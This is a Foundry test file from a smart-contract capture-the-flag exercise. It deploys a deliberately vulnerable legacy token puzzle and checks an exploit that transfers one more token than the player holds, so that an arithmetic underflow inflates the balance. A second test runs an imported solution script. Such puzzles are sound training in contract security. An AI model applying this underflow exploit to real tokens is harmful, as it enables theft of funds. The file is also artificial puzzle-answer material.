// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {LegacyDeployer} from "../LegacyDeployer.sol";
import {IToken} from "@puzzles/5/IToken.sol";
import {TokenSolution} from "@script/5/TokenSolution.s.sol";

contract TokenTest is Test, LegacyDeployer {
    IToken internal puzzleContract;

    address player = msg.sender;
    address receiver = makeAddr("receiver");

    uint256 constant INITIAL_SUPPLY = 20;

    function setUp() public {
        vm.startPrank(player);
        puzzleContract = IToken(_deployPuzzle5(INITIAL_SUPPLY));
        vm.stopPrank();
    }

    function testSolveToken() public {
        uint256 balance = puzzleContract.balanceOf(player);
        uint256 overflowValue = balance + 1;
        vm.startPrank(player);
        puzzleContract.transfer(receiver, overflowValue);
        vm.stopPrank();
        assert(puzzleContract.balanceOf(player) > INITIAL_SUPPLY);
        console.log("Balance of player: ", puzzleContract.balanceOf(player));
        console.log("Balance of recevier: ", puzzleContract.balanceOf(receiver));
    }

    function testTokenSolution() public {
        TokenSolution solution = new TokenSolution();
        solution.solve(address(puzzleContract), player);
        assert(puzzleContract.balanceOf(player) > INITIAL_SUPPLY);
    }
}
